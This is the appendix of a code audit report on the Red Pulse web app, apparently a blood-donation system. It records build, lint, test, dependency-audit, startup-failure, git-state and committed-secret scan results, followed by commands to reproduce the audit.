dist/assets/index-4CdOYOoy.css   48.52 kB │ gzip:   8.82 kB
dist/assets/index-CYzNQmcM.js  1,105.15 kB │ gzip: 316.90 kB

(!) Some chunks are larger than 500 kB after minification. Consider:
- Using dynamic import() to code-split the application
- Use build.rollupOptions.output.manualChunks to improve chunking
- Adjust chunk size limit for this warning via build.chunkSizeWarningLimit.
✓ built in 7.66s
===== build exit: 0 =====
```

## C.3 `npx tsc -b` (PASSED)

```
=== tsc exit: 0 ===
```

## C.4 `npx eslint .` (PASSED — 2 warnings)

```
src/context/AuthContext.tsx
  104:17  warning  Fast refresh only works when a file only exports components  react-refresh/only-export-components
src/context/ThemeContext.tsx
   12:14  warning  Fast refresh only works when a file only exports components  react-refresh/only-export-components
✖ 2 problems (0 errors, 2 warnings)
===== eslint exit: 0 =====
```

## C.5 `npx vitest run` (PASSED — 9/9)

```
 RUN  v3.2.7

 ✓ src/__tests__/inventory.test.tsx > Inventory Schema Validation > validates a valid inventory stock item
 ✓ src/__tests__/inventory.test.tsx > Inventory Schema Validation > rejects invalid blood group string
 ✓ src/__tests__/bloodRequest.test.tsx > Blood Request Schema Validation > validates a correct blood request payload
 ✓ src/__tests__/bloodRequest.test.tsx > Blood Request Schema Validation > fails validation when unitsRequired is negative or zero
 ✓ src/__tests__/auth.test.tsx > Authentication Pages > renders login form with email and password fields
 ✓ src/__tests__/auth.test.tsx > Authentication Pages > renders registration form with role selection
 ✓ src/__tests__/routes.test.tsx > Routing & Protection > renders homepage at root path
 ✓ src/__tests__/routes.test.tsx > Routing & Protection > redirects unauthorized users trying to access protected donor route to login
 ✓ src/__tests__/routes.test.tsx > Routing & Protection > renders 404 page for unknown paths

 Test Files  4 passed (4)
      Tests  9 passed (9)
   Duration  11.68s
===== vitest exit: 0 =====
```

Note: `frontend.integration.test.ts` is **not collected** — `vitest.config.ts:12` excludes `**/*.integration.test.ts`.

## C.6 `npm audit --omit=dev` (PASSED — 0 vulnerabilities)

```json
{
  "auditReportVersion": 2,
  "vulnerabilities": {},
  "metadata": {
    "vulnerabilities": { "info":0, "low":0, "moderate":0, "high":0, "critical":0, "total":0 },
    "dependencies": { "prod":88, "dev":344, "optional":76, "peer":9, "total":432 }
  }
}
```

## C.7 `mvnw -o -DskipTests compile` (PASSED)

```
===== mvn offline compile exit: 0 =====
```

## C.8 `startup.log` — recorded application startup (FAILED)

```
2026-09-09T12:17:34.467+05:30 INFO  --- [red-pulse-backend] [main] com.redpulse.RedPulseApplication : No active profile set, falling back to 1 default profile: "default"
2026-09-09T12:17:34.985+05:30 INFO  --- .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 46 ms. Found 1 JPA repository interface.
2026-09-09T12:17:35.455+05:30 INFO  --- o.s.boot.tomcat.TomcatWebServer : Tomcat initialized with port 8080 (http)
2026-09-09T12:17:35.524+05:30 INFO  --- o.apache.catalina.core.StandardService : Starting service [Tomcat]
2026-09-09T12:17:35.933+05:30 INFO  --- o.s.boot.tomcat.TomcatWebServer : Tomcat started on port 8080 (http)
2026-09-09T12:17:35.955+05:30 INFO  --- org.flywaydb.core.FlywayExecutor : Database: jdbc:postgresql://localhost:5432/redpulse (PostgreSQL 18.3)
2026-09-09T12:17:36.034+05:30 WARN  --- ConfigServletWebServerApplicationContext : Exception encountered during
  context initialization - cancelling refresh attempt: org.springframework.beans.factory.BeanCreationException:
  Error creating bean with name 'entityManagerFactory' ... Failed to initialize dependency 'flywayInitializer' ...
  Validate failed: Migrations have failed validation
  Migration checksum mismatch for migration version 1
  -> Applied to database : -1943230858
  -> Resolved locally    : -1547703938
  Either revert the changes to the migration, or run repair to update the schema history.
```

## C.9 `mvnw -o dependency:tree -Dscope=test` (excerpt — confirms no embedded database)

```
[INFO] +- org.springframework.boot:spring-boot-starter-data-jpa:jar:4.1.1:compile
[INFO] +- org.springframework.boot:spring-boot-starter-flyway:jar:4.1.1:compile
[INFO] +- org.springframework.boot:spring-boot-starter-security:jar:4.1.1:compile
[INFO] +- org.springframework.boot:spring-boot-starter-validation:jar:4.1.1:compile
[INFO] +- org.springframework.boot:spring-boot-starter-webmvc:jar:4.1.1:compile
[INFO] +- org.springframework.boot:spring-boot-starter-mail:jar:4.1.1:compile
[INFO] +- org.flywaydb:flyway-database-postgresql:jar:12.4.0:compile
[INFO] +- org.postgresql:postgresql:jar:42.7.13:runtime
[INFO] +- org.springframework.boot:spring-boot-starter-data-jpa-test:jar:4.1.1:test
[INFO] |  +- org.springframework.boot:spring-boot-starter-test:jar:4.1.1:test
[INFO] |  |  +- org.assertj:assertj-core:jar:3.27.7:test
[INFO] |  |  +- org.junit.jupiter:junit-jupiter:jar:6.0.3:test
[INFO] |  |  +- org.mockito:mockito-core:jar:5.23.0:test
[INFO] +- org.springframework.boot:spring-boot-starter-flyway-test:jar:4.1.1:test
[INFO] +- org.springframework.boot:spring-boot-starter-security-test:jar:4.1.1:test
[INFO] +- org.springframework.boot:spring-boot-starter-webmvc-test:jar:4.1.1:test
```

**No H2, HSQLDB, Derby, or Testcontainers anywhere in the tree.**

## C.10 Git state

```
$ git rev-list --count HEAD
1

$ git log --all --oneline
2e9a910 copilot checkpoint: 7dda6320-e182-4fbb-99a5-72ed584ebe5c @ fc6cceab-0836-4383-a4c0-1cb68ee09f43   (unreachable)
e5bf2e5 Add Red Pulse frontend

$ git ls-files | wc -l
132

$ git ls-files --others --exclude-standard | wc -l
180

$ git check-ignore -v "Red-Pulse Backend/red-pulse/.env"
Red-Pulse Backend/red-pulse/.gitignore:35:.env    Red-Pulse Backend/red-pulse/.env

$ git ls-files --error-unmatch "Red-Pulse Backend/red-pulse/.env"
error: pathspec 'Red-Pulse Backend/red-pulse/.env' did not match any file(s) known to git
```

## C.11 Secret scan (full repository, tracked files)

Patterns searched: Google API keys (`AIza…`), Stripe live keys, PEM private-key headers, GitHub PATs (`ghp_…`), AWS access keys (`AKIA…`), Slack tokens (`xox[baprs]-…`), JWT-shaped strings, and `key = "value"` for password/secret/token/credential.

| Pattern | Hits in tracked files |
|---|---|
| `AIza[0-9A-Za-z_-]{35}` | **0** |
| `sk_live_…` | **0** |
| `-----BEGIN … PRIVATE KEY-----` | **0** (only a `YOUR_PRIVATE_KEY` placeholder in the git-ignored `.env`) |
| `ghp_…` | **0** |
| `AKIA…` | **0** |
| `xox[baprs]-…` | **0** |
| JWT-shaped | **0** |
| `password|secret|token = "…"` | Only storage-key literals (`'redpulse.accessToken'`), mock-mode tokens (`'mock-access-token-requester'`), and test fixtures (`'Password123!'`, `'Admin123!'` in the excluded integration test) |

**Conclusion: no secrets are committed. `.gitignore` correctly excludes all `.env` files, logs, `target/`, and `dist/`.**

---

## C.12 How to reproduce this audit

```powershell
# 0. Commit the backend FIRST (it is currently untracked — see DO-003)

# 1. Backend compile
cd 'Red-Pulse Backend\red-pulse'
.\mvnw.cmd -o -DskipTests compile

# 2. Backend tests — expect exit 1 (BE-001 / BE-002)
.\mvnw.cmd -o test

# 3. Prove BE-001's root cause is a stale shadowing artifact
.\mvnw.cmd -o clean test          # would fix the shadowing, but still needs a live DB (BE-002)
Get-Content target\test-classes\application.yml   # before clean: 96-byte stale file

# 4. Frontend
cd '..\..\Red Pulse-Frontend'
npx tsc -b                          # expect exit 0
npx eslint .                        # expect exit 0, 2 warnings
npx vitest run                      # expect exit 0, 9/9
npm run build                       # expect exit 0, 1,105 kB chunk warning
npm audit --omit=dev                # expect 0 vulnerabilities

# 5. Confirm the API contract is not shared
#    Compare frontend enum lists with backend enums — 5 divergences (FE-011/013/014/015 + field names)
#    Compare frontend normalisers: 7 adapters normalise, 5 do not (Root Cause 2)

# 6. Confirm the authorization gap
#    Count @PreAuthorize across the backend — expect 3
Select-String -Path (Get-ChildItem -Recurse -File -Include *.java src\main\java).FullName -Pattern '@PreAuthorize'
```

---

**— END OF DOCUMENT —**

*Report generated 2026-09-27. No source file was modified in the production of this document. No commit was created. No branch was changed. No dependency was installed. Git history was not touched.*










